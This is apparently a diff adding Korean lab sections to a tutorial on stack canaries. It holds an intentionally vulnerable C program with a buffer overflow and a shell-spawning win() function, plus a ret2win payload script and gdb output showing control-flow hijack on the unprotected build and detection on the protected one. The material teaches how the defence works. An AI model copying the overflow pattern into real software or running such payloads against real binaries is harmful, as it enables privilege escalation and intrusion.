@@ -310,20 +310,462 @@ Stack Canary는 하나의 구성 요소가 아니라,
 
 ## 5. 실습 구성
 
+본 실습에서는 동일한 소스코드를 두 가지 방식으로 컴파일하여,
+Stack Canary의 유무에 따른 동작 차이를 비교한다.
+
+* Canary OFF 바이너리
+* Canary ON 바이너리
+
+두 바이너리는 Canary 유무만 다르고,
+그 외 조건(NX, PIE 등)은 동일하게 유지한다.
+
+이를 통해 동일한 payload가 왜 한쪽에서는 성공하고, 다른 쪽에서는 실패하는지 분석한다.
+
 ### 5.1 취약 코드
+
+실습에 사용한 코드는 다음과 같다.
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include <unistd.h>
+
+void win(){
+    setreuid(geteuid(), geteuid());
+    setregid(getegid(), getegid());
+    system("/bin/sh");
+}
+
+void vuln(int value){
+    char buf[16];
+
+    puts("input:");
+    read(0, buf, 64);
+
+    printf("value: %d\n", value);
+}
+
+int main(){
+    int num = 5;
+    vuln(num);
+}
+```
+
+#### 코드 특징
+
+* `char buf[16]`
+  → 고정 길이 버퍼
+
+* `read(0, buf, 64)`
+  → 16바이트 버퍼에 64바이트 입력 가능
+  → **Stack Buffer Overflow 발생**
+
+* `win()` 함수 존재
+  → RET overwrite 성공 시 control flow 탈취 지점
+
+이 구조는 전형적인 **ret2win 실습 형태**이다.
+
 
 ### 5.2 컴파일 옵션
 
+동일한 소스코드를 다음 두 가지 방식으로 컴파일한다.
+
+#### 1) Canary OFF
+
+```bash
+gcc -m32 sample.c -o stack-canary-off \
+    -O0 \
+    -fno-stack-protector \
+    -fno-omit-frame-pointer \
+    -no-pie \
+    -z noexecstack
+```
+
+#### 2) Canary ON
+
+```bash
+gcc -m32 sample.c -o stack-canary-on \
+    -O0 \
+    -fstack-protector-all \
+    -fno-omit-frame-pointer \
+    -no-pie \
+    -z noexecstack
+```
+
+#### 옵션 설명
+
+| 옵션                        | 목적                    |
+| ------------------------- | --------------------- |
+| `-m32`                    | 32-bit 환경에서 컴파일       |
+| `-O0`                     | 최적화 비활성화 (디스어셈 분석 용이) |
+| `-fno-omit-frame-pointer` | EBP 유지 (스택 구조 확인 용이)  |
+| `-no-pie`                 | 고정 주소 (ret2win 실습 편의) |
+| `-z noexecstack`          | NX 유지                 |
+| `-fstack-protector-all`   | 모든 함수에 Canary 삽입      |
+
+두 바이너리의 차이는:
+
+```
+-fno-stack-protector
+vs
+-fstack-protector-all
+```
+
+이다.
+
+
 ### 5.3 보호기법 상태
+
+`checksec` 결과는 다음과 같다.
+
+#### Canary OFF
+
+```
+Canary: No canary found
+NX:     Enabled
+PIE:    No PIE
+RELRO:  Partial
+```
+
+#### Canary ON
+
+```
+Canary: Canary found
+NX:     Enabled
+PIE:    No PIE
+RELRO:  Partial
+```
 
 ---
 
+
 ## 6. Canary off 바이너리 분석
+
+Canary가 비활성화된 바이너리에서
+Stack Buffer Overflow를 이용한 RET overwrite가 가능한지 확인한다.
+
+
+### 6.1 Prologue 분석
+
+`vuln()`의 디스어셈블 결과는 다음과 같다.
+
+```asm
+0x080491ec <+0>:  push   ebp
+0x080491ed <+1>:  mov    ebp,esp
+0x080491ef <+3>:  sub    esp,0x18
+```
+
+해석:
+
+* 새로운 스택 프레임 생성
+* 로컬 변수 영역으로 **0x18 (24 bytes)** 확보
+
+`read()` 호출 부분:
+
+```asm
+0x08049207 <+27>: lea    eax,[ebp-0x18]
+```
+
+따라서:
+
+* `buf` 시작 주소 → `[ebp-0x18]`
+
+---
+
+스택 구조 (Canary OFF):
+
+```
+높은 주소
++----------------+
+| saved RET      |  
++----------------+ ← [ebp+4]
+| saved EBP      |  
++----------------+ ← [ebp]
+|                |
+| local space    |
+|                |
++----------------+
+| buf[16]        |  
++----------------+ ← [ebp-0x18]
+낮은 주소
+```
+
+이 상태에서는
+`buf`와 `saved RET` 사이에 보호 장치가 존재하지 않는다.
+
+
+
+### 6.2 Epilogue 분석
+
+```asm
+0x08049229 <+61>: leave
+0x0804922a <+62>: ret
+```
+
+Canary 검증 코드가 존재하지 않는다.
+
+즉, 함수 종료 시 아무런 무결성 검사가 수행되지 않는다.
+
+따라서 `saved RET`이 덮여 있다면,
+`ret` 명령은 그 값을 그대로 EIP에 로드한다.
+
+
+### 6.3 Offset 계산
+
+`buf` 시작:
+
+```
+[ebp-0x18]
+```
+
+`saved RET`:
+
+```
+[ebp+0x4]
+```
+
+거리 계산:
+
+```
+0x18 (buf → saved EBP)
++ 0x4 (saved EBP → saved RET)
+= 0x1c
+```
+
+따라서: offset = 0x1c (28 bytes)
+
+
+### 6.4 페이로드 작성
+
+`win()` 함수 주소:
+
+```
+(gdb) info addr win
+Symbol "win" is at 0x80491c6 in a file compiled without debugging.
+```
+
+최종 payload:
+
+```
+"A" * offset + win_addr
+```
+
+Python 스크립트:
+
+```python
+payload = b"A" * 0x1c
+payload += struct.pack("<I", 0x080491c6)
+```
+
+
+## 6.5 페이로드 입력 결과
+
+`ret` 직전에 브레이크를 설정한다.
+
+```gdb
+(gdb) b *0x0804922a
+(gdb) r < <(python3 payload.py 0x080491c6)
+```
+
+한 단계 실행:
+
+```gdb
+(gdb) ni
+```
+
+결과:
+
+```text
+0x080491c6 in win ()
+```
+
+해석:
+
+* `saved RET`이 `0x080491c6`으로 덮였다.
+* `ret` 명령 실행 후 EIP가 `win()`으로 변경되었다.
+* Control Flow Hijack 성공.
+
+즉, Canary가 비활성화된 상태에서는:
+
+* `buf` overflow를 통해 `saved RET`을 직접 덮을 수 있으며
+* 함수 종료 시 별도의 무결성 검사가 없으므로
+* 제어 흐름 탈취가 가능하다.
+
+터미널에서 확인 시:
+```
+$ (python3 payload.py 0x80491b6;cat) | /tmp/stack-canary-lab/stack-canary-off
+input:
+value: 5
+id
+uid=0(root) gid=1000(name) groups=1000(name),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin
+```
 
 ---
 
 ## 7. Canary on 바이너리 분석
 
+Canary가 활성화된 바이너리에서
+동일한 payload가 왜 실패하는지 분석한다.
+
+
+### 7.1 Prologue 분석
+
+`vuln()`의 디스어셈블 결과:
+
+```asm
+0x08049218 <+0>:  push   ebp
+0x08049219 <+1>:  mov    ebp,esp
+0x0804921b <+3>:  sub    esp,0x38
+0x08049224 <+12>: mov    eax,gs:0x14
+0x0804922a <+18>: mov    DWORD PTR [ebp-0xc],eax
+```
+
+해석:
+
+1. 로컬 변수 공간 0x38 (56 bytes) 확보
+   → Canary 및 추가 로컬 변수 포함
+
+2. `gs:0x14`에서 **canary 원본 값**을 읽어옴
+
+3. 해당 값을 `[ebp-0xc]`에 저장
+   → 스택 프레임에 **canary 복사본 생성**
+
+스택 구조 (Canary ON): 
+
+```text
+높은 주소
++----------------+
+| saved RET      |  
++----------------+ ← [ebp+4]
+| saved EBP      |  
++----------------+ ← [ebp]
+| canary 🐤      |  
++----------------+ ← [ebp-0xc]
+| buf[16]        |  
++----------------+ ← [ebp-0x1c]
+낮은 주소
+```
+
+이제 `buf`와 `saved RET` 사이에
+**4바이트 canary가 삽입되었다.**
+
+> **노트 ── `-O0`에서의 eax**
+>
+> Stack Canary가 추가되며 레지스터의 역할이 변경됨에 따라
+> prologue에서 eax에 함수의 인자를 복사하는 줄이 추가되었다.
+>
+> 이는 `-O0` 옵션이 최적화를 수행하지 않기 때문에 나타난다.
+
+### 7.2 Epilogue 분석
+
+함수 종료 직전:
+
+```asm
+0x08049266 <+78>: mov    eax,DWORD PTR [ebp-0xc]
+0x08049269 <+81>: sub    eax,DWORD PTR gs:0x14
+0x08049270 <+88>: je     0x8049277 <vuln+95>
+0x08049272 <+90>: call   0x8049060 <__stack_chk_fail@plt>
+0x08049277 <+95>: leave
+0x08049278 <+96>: ret
+```
+
+해석:
+
+1. 스택의 canary 복사본을 읽음
+2. TLS의 원본과 비교
+3. 같으면 → 정상 `leave; ret`
+4. 다르면 → `__stack_chk_fail()` 호출
+
+즉, RET을 사용하기 직전에 무결성 검사를 수행한다.
+
+
+### 7.3 동일 페이로드 입력
+
+Canary OFF에서 사용한 동일 payload:
+
+```text
+"A" * offset + win_addr
+```
+
+를 Canary ON 바이너리에 입력한다.
+
+※ canary가 삽입되어 스택 구조가 변경됨에 따라 offset 또한 0x20으로 변경되었다.
+
+Canary ON 상태에서는 buf와 saved RET 사이에 4바이트 canary가 삽입되므로,
+기존 offset(0x1c)으로 작성한 payload는 canary를 먼저 손상시킨다.
+
+#### 입력 전 canary 값:
+
+```gdb
+x/wx $ebp-0xc
+```
+
+예:
+
+```
+0xffffcedc:  0xcdabbc00
+```
+
+#### 입력 후 canary 값:
+
+```gdb
+x/wx $ebp-0xc
+```
+
+결과:
+
+```
+0xffffcedc:  0x41414141
+```
+
+→ buffer overflow로 인해 canary가 손상됨.
+
+
+### 7.4 실패 지점 확인
+
+`__stack_chk_fail`에 브레이크 설정:
+
+```gdb
+b *__stack_chk_fail
+r < <(python3 payload.py 0x080491c6)
+```
+
+실행 결과:
+
+```text
+*** stack smashing detected ***: terminated
+Program received signal SIGABRT
+```
+
+Backtrace:
+
+```text
+#7  __stack_chk_fail ()
+#8  0x08049277 in vuln ()
+```
+
+해석:
+
+* `vuln()`의 epilogue에서 canary 비교 실패
+* `__stack_chk_fail()` 호출
+* 프로그램 즉시 종료
+* `ret` 명령까지 도달하지 못함
+
 ---
 
 ## 8. 정리
+
+| 항목                  | Canary OFF | Canary ON        |
+| ------------------- | ---------- | ---------------- |
+| buf → RET overwrite | 가능         | 가능               |
+| RET 사용              | 수행됨        | 수행되지 않음          |
+| win() 진입            | 성공         | 실패               |
+| 종료 지점               | win()      | __stack_chk_fail |
+
+Canary는:
+
+* RET overwrite 자체를 막지 않는다.
+* 하지만 RET이 사용되기 직전에 무결성 검사를 수행하여,
+* 변조가 감지되면 프로그램을 종료한다.
+
+즉, Canary는 **제어 흐름 변경을 감지하는 보호기법**이다.
